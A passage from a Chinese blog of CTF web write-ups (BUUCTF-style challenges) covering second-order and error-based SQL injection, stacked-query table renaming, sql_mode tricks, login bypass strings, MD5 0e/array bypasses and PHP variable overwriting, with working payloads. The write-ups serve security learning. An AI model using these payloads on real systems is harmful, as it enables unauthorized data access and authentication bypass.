centered&quot;&gt;</span><br><span class="line">                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;</span><br><span class="line">                &lt;h1&gt;删除订单&lt;/h1&gt;</span><br><span class="line">                &lt;form method=&quot;post&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;/h3&gt;</span><br><span class="line">                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;/h3&gt;</span><br><span class="line">                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;button class=&apos;btn btn-lg  btn-sub btn-white&apos; type=&quot;submit&quot;&gt;删除订单&lt;/button&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">                &lt;?php global $msg; echo &apos;&lt;h2 class=&quot;mb&quot; style=&quot;color:#ffffff;&quot;&gt;&apos;.$msg.&apos;&lt;/h2&gt;&apos;;?&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;</span><br><span class="line">            &lt;a href=&quot;./index.php&quot;&gt;</span><br><span class="line">                &lt;button class=&apos;btn btn-lg btn-register btn-sub btn-white&apos;&gt;返回&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;a href=&quot;./search.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;a href=&quot;./change.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>看起来好像很长但是关键的php代码其实很少。<br>先来看index.php的php代码写了啥。<br>先检查了有没有file这个参数。然后用正则过滤了一些不能使用的关键字。<br><strong>可以发现没过滤php://filter</strong>.那么就可以使用如下语句读取源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:filter//read=convert.base64-encode/resource=file</span><br></pre></td></tr></table></figure>
+<p>其实记忆非常方便。一个php://filter协议<br>要执行的操作。读(read)，读的方法是(convert.base64-encode)<br>读的文件是(resource=file)。<br>如果匹配正则没问题的话，最后就包含指定的文件，于是就可以看到源码的base64编码了。</p>
+<hr>
+<p>再看看confirm.php写了啥<br>检查了user_name,address,phone三个参数。<br>然后是过滤的关键字，可以看到过滤了非常多的关键字。<br><strong>注意这里没有对address使用正则的过滤</strong>，也就是说，address中可以包含敏感词<br>往下看，使用了预编译的方法，那这里肯定没法直接注入了。<br>这个文件首先查看用户提交的信息，如果已经存在的话提示已经提交<br>如果数据库没有相应的记录，就插入一条记录。</p>
+<hr>
+<p>再看看search.php写了什么<br>获取了user_name和phone两个参数，同样有对关键字的过滤<br>下面的代码构造了一个sql查询语句。查询用户记录，没啥特别的<br>想在这里进行注入也不现实。</p>
+<hr>
+<p>看看change.php写了啥东西<br>获取了user_name,address,phone三个参数。<br>同样只对username和phone进行了正则的过滤。<br>这里首先通过username和phone查看用户是不是存在<br><strong>然后构造了一条sql查询语句，直接取出用户先前填的地址，放到old_address中</strong><br>这里发现是直接把address复制粘贴到old_address中的，而且在confirm中并没有对address进行过滤。<br>很明显这里就是突破口了，考察的知识点是2次注入。<br><strong>注册的时候在地址处输入payload。然后去修改信息，使得payload得以运行</strong><br>这里使用了报错注入的方法，使信息回显。</p>
+<hr>
+<p>一开始我是想直接使用报错注入爆表名列名拿flag的。尝试了如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; or extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database())))#</span><br><span class="line">&apos; or extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_name=&apos;user&apos; limit 12,1)))#</span><br></pre></td></tr></table></figure>
+<p>这两个payload分别是读表名，读列名的。<br>尝试读取数据的时候出错了。<br>最后还是去看了别人的wp。<br>使用了load_file的方法直接读取了根目录下的flag.txt文件。<br><strong>发现很多人也根本解释不出来为什么他们会知道flag.txt的位置</strong><br>这里就归结于各位大佬经验丰富吧。</p>
+<hr>
+<p>看看load_file这个函数啥意思。<br>读取文件并返回文件内容(返回的是字符串类型)，这个函数<strong>必须指定完整的文件路径</strong>。还要有FILE权限。如果不满足这些条件此函数返回NULL。<br>最后构造如下payload，读取/flag.txt的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or extractvalue(1, concat(0x7e, (select substr(load_file(&apos;/flag.txt&apos;),1,20))))#</span><br></pre></td></tr></table></figure>
+<p>因为报错注入回显有长度限制，所以要读取两次。</p>
+<h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>这题的难点应该是找到/flag.txt和使用load_file函数吧。<br>发现有二次注入之后就想办法触发之前的注入。(本题是修改信息触发)<br>直接想要使用union select好像是不会回显的，所以使用了报错注入来获取回显内容。<br>extractvalue的第二个参数要求满足xpatp语法。如果不满足就会报错，并且将查询结果放在报错信息里(所以注入的时候sql语句都会放在第二位参数这里，不然查询结果不回显)</p>
+<ul>
+<li>二次注入的触发</li>
+<li>load_file函数的使用</li>
+<li>extractvalue函数的使用，<strong>在联合查询受限的时候</strong>，使数据可以回显。(查询结果会出现在报错信息中)<h2 id="强网杯2019随便注"><a href="#强网杯2019随便注" class="headerlink" title="强网杯2019随便注"></a>强网杯2019随便注</h2>知识点</li>
+<li>堆叠注入<blockquote>
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<p>进去的界面如下<br><img src="https://i.loli.net/2020/03/08/UlYndZR2DWQgiJw.png" alt="Snipaste_2020-03-08_09-20-34.png"><br>使用get方式传参。看了下源码，提示sqlmap没灵魂。那就不用sqlmap了。<br>看看有没有注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 or 1=1#</span><br><span class="line">1&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<p>发现是有注入点的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 3</span><br></pre></td></tr></table></figure>
+<p>发现有返回数据有两列。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,2 #</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/03/08/hV7oH83ueiCA2bg.png" alt="Snipaste_2020-03-08_09-27-20.png"><br>发现过滤了select和.还有其他很多关键词。<br>到这里的时候我并没有意识到本题考点在堆叠注入，还在找绕过方法（哈哈哈<br>后来发现实在编码啊，注释啊，放几个关键词看看是不是递归删除都没绕过去。估计是新知识点。<br>就去看wp了。<strong>发现考点是堆叠注入</strong>。</p>
+<hr>
+<p>堆叠注入和普通注入的区别首先是堆叠注入对sql语句使用没有限制。可以使用诸如以下语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show columns from tablename;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>查看数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show databases;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/03/08/YbSmWelQVkAJM7d.png" alt="Snipaste_2020-03-08_09-50-27.png"><br>查看当前数据库的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show tables;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/03/08/tvS9Zu8OqPcwi1Q.png" alt="Snipaste_2020-03-08_09-51-09.png"><br>查看表中列的属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show columns from words;#</span><br><span class="line">1&apos;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/03/08/apCDuL9K4gBIb3N.png" alt="Snipaste_2020-03-08_09-52-06.png"><br><img src="https://i.loli.net/2020/03/08/QCUoRWi5sadPE3G.png" alt="Snipaste_2020-03-08_09-53-24.png"><br><strong>注意这里在对1919810931114514这个表查询的时候使用了反引号。</strong><br>一开始不知道这个点，在这里卡了好久。<br>其实对于这些表名啥的都可以用反引号括起来。比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show columns from `words`;#</span><br></pre></td></tr></table></figure>
+<p>也是可以的。<br><strong>只是对于数字串(纯数字)必须括起来。不然不会回显。</strong></p>
+<hr>
+<p>到这里的时候常规方法结束了。接下来要考虑怎么获取flag。<br>可以看到words中的数据是两列，而一般查询的时候返回的也是两列。<br>应该不难猜到words是默认的查询表。<br>猜测后端查询语句可能如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from words where id = &apos;yourinput&apos;;</span><br></pre></td></tr></table></figure>
+<p>这里已经过滤了select关键字。要想使用联合查询什么东西的我反正是想不出来。<br>借鉴以下大佬萌的思路。这里只能利用<br>select * from words这一段来做事。<br>和之前命令执行的那一题online tool有异曲同工之妙。(那题是nmap命令不能改，只能利用参数)<br>而本题是select id,data from words 不能变。想办法从1919810931114514表中取数据。</p>
+<hr>
+<p>之前说了很多次。堆叠注入可以使用的命令很多。<br>虽然固定查询的表名不能变。但是我萌可以给表改名啊！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename table origin_name to final_name</span><br></pre></td></tr></table></figure>
+<p>这条语句可以给表改名字。<br>那我们先把words改成别的名字，再把1919810931114514改成words不就可以偷梁换柱了吗？<br>到了这里还需要解决以下列的问题。<br>虽然1919810931114514成功改名成为words了。但是列名还是flag。要先把flag改成id这一列(这里大佬的解释是避免一开始无法查询)<br>可以使用alter table的方式改变表的结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table table_name operate</span><br></pre></td></tr></table></figure>
+<p>最后构造如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure>
+<p>注意到表名列名都用了反引号(`)括起来了。看看payload的意思<br>先把words改成了words1<br>然后把1919810931114514改成words<br>再把words表的flag列改成id。还指定了id列的属性。<br>最后又查看了一遍words的列属性确保改动没有错误。<br>然后使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or &apos;1&apos;=&apos;1  该条件永远为真。所有会返回表内所有数据。如果不使用这个payload的话你就想象一下有一列叫id的。里面数据是flag&#123;xxx&#125;。是查不出来的</span><br></pre></td></tr></table></figure>
+<p>来获取flag</p>
+<h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><p>本题首先是考察了堆叠注入<br>对于sql语言基础也有一点考察吧。像我就完全不会各种show语句。<br>select被过滤的情况下有点束手无策。其实那么多关键字被过滤应该要想到堆叠注入的。<br>不然要注入应该很困难。还是要把自己的基础打结实点。</p>
+<ul>
+<li>察觉堆叠注入。</li>
+<li>反引号的使用。本题在数字字符串表名那里卡了蛮久，因为不知道反引号这个知识点。</li>
+<li>sql语法基础。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show talbes;</span><br><span class="line">show columns from table_name(可用反引号将表名括起来)。</span><br><span class="line">还有rename table origin_name to final_name.</span><br><span class="line">alter table table_name operate</span><br></pre></td></tr></table></figure>
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2>知识点</li>
+<li>set sql_mode</li>
+<li>堆叠注入。<br>一开始进去的页面是这样的：<br><img src="https://i.loli.net/2020/03/08/mVuKHQzgXG9i576.png" alt="Snipaste_2020-03-08_14-25-53.png"><br>尝试fuzz一下,发现过滤了一些关键字<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from，union，flag,where,or,and</span><br></pre></td></tr></table></figure>
+发现可以进行堆叠注入。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;select version();#</span><br><span class="line">1;show databases;#</span><br><span class="line">1;show tables;#</span><br></pre></td></tr></table></figure>
+看了后端DBMS和有几个数据库。<br>当前在ctf数据库下的Flag表。<br>由于from flag都被过滤，所以不能使用show columns from Flag的方式看表里的列。<br>而且也不能使用rename等方法。因为表名flag已经被过滤了。</li>
+</ul>
+<hr>
+<p>一开始想到的是有没有办法绕过这些过滤。比如使用进制转换，把数字转换成函数名然后想办法查询的。<br>后来发现行不通。实在想不通了就去看大佬们的wp了。<br>令人绝望的是这次我连wp都看不懂。</p>
+<hr>
+<p>大家的解法好像都是因为后端源码泄露了。看到了语句拼接方式，如下<br><img src="https://i.loli.net/2020/03/08/1nNHZmwWYl6tCEQ.png" alt="Snipaste_2020-03-08_14-33-56.png"><br>然后大家都用了一个payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,2</span><br></pre></td></tr></table></figure>
+<p>这样拼接上去之后原来的sql语句就变成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,2||flag from Flag</span><br></pre></td></tr></table></figure>
+<p>在我本地测试结果是这样的：<br><img src="https://i.loli.net/2020/03/08/TBLGFsrl3a8VOHu.png" alt="Snipaste_2020-03-08_14-38-54.png"></p>
+<hr>
+<p>好了，先搞清楚为什么能这样查表吧。<br>在mysql和MariaDB里面，||表示或运算。所以2||flag为真。实际上就是1.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select *,2||flag from Flag</span><br><span class="line">相当于</span><br><span class="line">select *,1 from Flag</span><br></pre></td></tr></table></figure>
+<p>实际在本地测试，select *,1 from Flag是不报错的。select *,100 from Flag当然也没事。<br>就暂时总结出一个这样的规律吧，使用select number from table; 如果这个数字的列不存在是不会报错的。</p>
+<hr>
+<p>这题的官方解法应该是要我们自己猜后端查询语句。<br>说实话我这种水平那肯定是做不出来了(假如没有源码泄露)。<br>要猜语句应该是有提示才对的。其实自己试试各种数字上去(结合前面的查询语句理解一下)。发现查询的结果都是1。<br>这就是要我们从结果猜到后端做了或运算。<br>不过*,2这种拼接方法属于非预期解。看看预期解的做法。</p>
+<hr>
+<p>官方预期是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1;set sql_mode=pipes_as_concat;select 1</span><br></pre></td></tr></table></figure>
+<p>结合刚才看到的泄露源码一看。就变成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag;</span><br></pre></td></tr></table></figure>
+<p>三条句子。看看什么意思。<br>select 1;没啥好说的。返回1.<br>sql_mode=pipes_as_concat;看意思就知道，把管道符当成concat来用。<br>于是select 1||flag from Flag;就变成了 select concat(1,flag) from Flag;<br>这样就能理解了！就是先查出flag的值，在前面拼接上1，然后输出！</p>
+<hr>
+<p>总结，这道题其实对我收益最大的不是什么堆叠注入。是sql语法。<br>本题我学到了 </p>
+<ul>
+<li>1||flag ||为或运算的时候的用法</li>
+<li>1+flag</li>
+<li>set sql_mode=pipes_as_concat;后 1||flag</li>
+<li>set sql_mode这个知识点。<br>三种用法。还更加熟悉了sql查询在某些情况下不会报错。<br>||为或运算时，1||flag为真。select 1||flag;就是select 1;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1+flag from flag;</span><br></pre></td></tr></table></figure>
+本条查询也是合法的！意义是先查出flag的值，再给值加1.<br>最后是set sql_mode=pipes_as_concat之后的||的运用。和concat一样了哈哈。<br>学到好多sql知识。挺开心的。嗯~</li>
+</ul>
+<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>知识点</p>
+<ul>
+<li>万能密码</li>
+<li>登录注入<br>进去的页面是这样的<br><img src="https://i.loli.net/2020/03/08/yXR7TxJoQzGw2jl.png" alt="Snipaste_2020-03-08_22-51-51.png"><br>试了一下用户名admin,root都不行。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &apos; 发现报错了。这里可以注入</span><br></pre></td></tr></table></figure>
+后来继续fuzz了一下。大概猜测到后端语句如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xx from xx where username=&apos;input&apos; and password=&apos;input&apos;</span><br></pre></td></tr></table></figure>
+而且这里要登录，然后就联想到了万能密码。<br>构造如下payload<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or &apos;1&apos; or &apos;1 密码随便输</span><br><span class="line">sql语句就变成了</span><br><span class="line">select xx from xx where username=&apos;1&apos; or &apos;1&apos; or &apos;1&apos; and password=&apos;something&apos;;</span><br><span class="line">由于and运算优先级比or高。这里密码无论输入什么，整个sql语句返回都为真。成功登录拿到flag</span><br></pre></td></tr></table></figure>
+<h3 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h3>比较简单的一题。考点应该在万能密码构造语句这里。<br>可能还要一点点猜测后端查询sql语句的能力。<br>这里是不知道用户名的情况下的payload。这类构造是非常灵活的。<br>毕竟这可是hacker的填空游戏(w</li>
+<li>关注运算符优先级，灵活构造payload。<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2>知识点</li>
+<li>php的md5()函数设置ture的时候若已知用户名可构造一个永真语句登录</li>
+<li>0e绕过和数组绕过</li>
+</ul>
+<hr>
+<p>首先进去的页面如下<br><img src="https://i.loli.net/2020/03/09/y7JCuVQ1kKILFPr.png" alt="Snipaste_2020-03-09_10-32-34.png"><br>有点一头雾水，找找看有没有什么hint。找到了<br><img src="https://i.loli.net/2020/03/09/Dtmk65M3HC7TYQo.png" alt="Snipaste_2020-03-09_10-32-55.png"><br>这里提示了后端查询语句，结合提交参数可知我们提交的是密码。<br>要注意的是md5($pass,ture)这个函数，设置了true.是什么意思呢？来看看<br><img src="https://i.loli.net/2020/03/09/FRjBxnA24C1QX5P.png" alt="Snipaste_2020-03-09_10-35-56.png"><br>也就是说会返回一个字符串。结合hint来看。我们只要找到一个md5加密后返回字符串为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or &apos;</span><br></pre></td></tr></table></figure>
+<p>格式的字符串就能构造万能密码了(password=’’ or ‘xxx’),为真。<br>这样的字符串有吗？当然有：</p>
+<ul>
+<li>ffifdyop<br>那第一关就这样过了，进入下一关</li>
+</ul>
+<hr>
+<p>找到了提示如下<br><img src="https://i.loli.net/2020/03/09/3rMHDwUFfiVeoSn.png" alt="Snipaste_2020-03-09_10-41-39.png"><br>要求用get传两个参数a和b。a和b的值要不相等，但是md5(a)和md5(b)的值要相等。这里要注意使用的是==，是弱相等。<br>有两个办法绕过</p>
+<ul>
+<li>0e绕过</li>
+<li>数组绕过<br>0e绕过是==对于两个0e开头的字符串会判断为相等。所以只要找到md5加密后以0e开头的两个字符串就行了<br>数组绕过是md5对数组加密会返回false。两个false就相等了，只要数组内容不同就可以轻易绕过。<br>0e绕过的payload:</li>
+<li>240610708</li>
+<li>s878926199a<br>数组绕过的payload</li>
+<li>a[]=b</li>
+<li>b[]=a<br>php传数组只需要在参数后边加上[]就行了。<br>进入下一关</li>
+</ul>
+<hr>
+<p><img src="https://i.loli.net/2020/03/09/s4UTakMBxHLzXmC.png" alt="Snipaste_2020-03-09_10-51-47.png"><br>最后一关依然是md5.不过这次的md5比较使用了全等号===。0e绕不过了，但是数组依然能绕。</p>
+<ul>
+<li>param1[] = a</li>
+<li>param2[] = b<h3 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h3>都是常规的考点了，对md5函数进行的考察，还有0e绕过和数组绕过的一点点知识。<br>不是难题。不够还是更加熟悉了md5的一些可能绕过方式。<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>知识点</li>
+<li>git泄露</li>
+<li>代码审计</li>
+</ul>
+<hr>
+<p>进去页面是这样的。<br><img src="https://i.loli.net/2020/03/09/Z4BybJDoXLIc62u.png" alt="Snipaste_2020-03-09_21-49-12.png"><br>试了一圈没发现入手的点。</p>
+<ul>
+<li>robots.txt没有</li>
+<li>header头没什么特别的</li>
+<li>发消息的message参数不可注入</li>
+<li>看着也不是要爆破的题</li>
+</ul>
+<p><strong>既然没思路就先扫一下后台。发现了.git泄露。</strong><br>上Githack拖一下文件夹下来看看。发现有两个php文件。<br>接下来就是代码审计的事了</p>
+<hr>
+<p>flag.php文件的内容<br><img src="https://i.loli.net/2020/03/09/Y7xK3apXA2CeHrO.png" alt="Snipaste_2020-03-09_22-01-23.png"><br>index.php文件的内容<br><img src="https://i.loli.net/2020/03/09/FbSCPisNz1v8G9r.png" alt="Snipaste_2020-03-09_22-01-41.png"><br>先看flag.php。就是把flag的值读到$flag里面。<br>再看index.php的内容。包含index.php文件，就相当于$flag=flag{xx}了。<br>下面的代码才是读出flag的关键。<br>看到最后一行有一个echo $flag.<br>前面好像是一堆限制条件啊，一开始的思路是想办法走到最后就能拿flag。<br>看到定义了几个变量，貌似没什么用处。<br>往下看到一个for循环对post上来的数组做了如下操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看到两个$$。也就是说我们传上来的参数会被定义为一个变量。比如你传一个flag=irrik;<br>经过这里的操作就会变成<br>$flag = irrik;<br>这样的话原来的$flag就被覆盖掉了。<br>再往下又看到一个for循环对Get上来的数组进行了如下操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同样是两个$$.不过这一回对参数名和值都采用了$$.<br>如果我们还是传入flag=irrik.经过处理就会变成<br>$flag = $irrik;<br>同样会把$flag污染掉。<br><strong>到这里应该就能看出来，不管传什么参数名，都会被处理成一个新的变量</strong><br>也就是说。也可以覆盖掉原有的参数名。<br>继续往下，还是一个for循环，对Get数组进行检查。<br>如果发现查询字符串里有flag这个参数，并且flag这个参数的值是另一个参数的名字(这里暂时称为x)，而且x这个参数的值不是flag的话。<br>就回显$handsome这个变量的值然后退出。<br>举个例子。这里如果要触发这个if条件，需要两个参数。比如：<br>flag=irrik&amp;irrik=test<br>这样就能成功触发这个exit语句。</p>
+<p>继续往下，这里必须通过get或post的方式上传一个flag参数。不然就会回显$yds的值然后退出</p>
+<p>最后一个条件是传的flag参数的值不能是flag。否则回显$is的值然后退出。<br>如果能绕过这一堆条件，就能看到此时$flag的值</p>
+<hr>
+<p>经过前面的分析。我们知道了要看到最后的$flag的值的条件</p>
+<ul>
+<li>必须post或get一个flag参数</li>
+<li>flag这个参数的值不能也是flag<br>前面又有分析。传入的参数会作为一个新的变量。如果我们传入了flag这个参数，<br>经过前面的两个for循环，原来的$flag肯定会被新的$flag覆盖掉。就没办法得到原来的flag了。<br>这里必须换一个思路。<br>其实静下来想想。有了前面两个for循环，我们现在不是有随便定义变量的能力了吗？<br>这里的突破口在于把现在有的$flag的值赋值给其他变量，让他们回显出来。<br>既然这里有三个exit语句，我就研究一下他们对应的payload。</li>
+</ul>
+<hr>
+<p>先看回显$handsome的。<br>触发条件是Get数组里必须有一个flag参数，而且flag参数的值必须是另一个参数的参数名。为了读到flag。另一个参数的值也必须是flag。<br>于是这里的payload就变为</p>
+<ul>
+<li>?handsome=flag&amp;flag=handsome</li>
+</ul>
+<p>再看回显$yds这个变量的payload。<br>要回显这个变量，只要不传入flag参数就行了。这里可以通过查询参数的方式获得payload</p>
+<ul>
+<li>?yds=flag</li>
+</ul>
+<p>最后看回显$is这个变量的方法。回显条件是通过get或者post方式传入flag=flag。<br>可以通过get方式获取flag。payload如下</p>
+<ul>
+<li>?is=flag&amp;flag=flag</li>
+</ul>
+<p>这里不能使用 ?is=flag 同时post一个flag=flag的形式来获取flag<br>因为程序运行顺序的原因，如果是这种情况会先把原来的$falg污染掉，读不到正确的flag。</p>
+<h3 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h3><p>本题还是考察了一下解题的思路，在找不到点的时候可以通过扫后台或者fuzz的方式来发现问题所在。<br>比如本题就考察了.git泄露。<br>然后就是考察了一点基础的代码审计能力。能不能读懂代码在干什么，然后想办法执行自己想要的操作。<br>本题需要使用一定的辅助工具来快速解题。比如扫后台的工具啊，Githack之类的脚本，还要postman这种方便操作参数的工具。<br>做这道题最大的收获还是思路的拓宽，代码审计能力也有那么一点提升吧哈哈。快速发现.git泄露会让自己在解题上取得先机。<br>源码泄露在ctf里应该不算少，有vim异常退出导致源码泄露的问题，也有本题的.git泄露的问题，要学会举一反三吧。</p>
+<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>知识点</p>
+<ul>
+<li>Smarty SSTI利用</li>
+</ul>
+<hr>
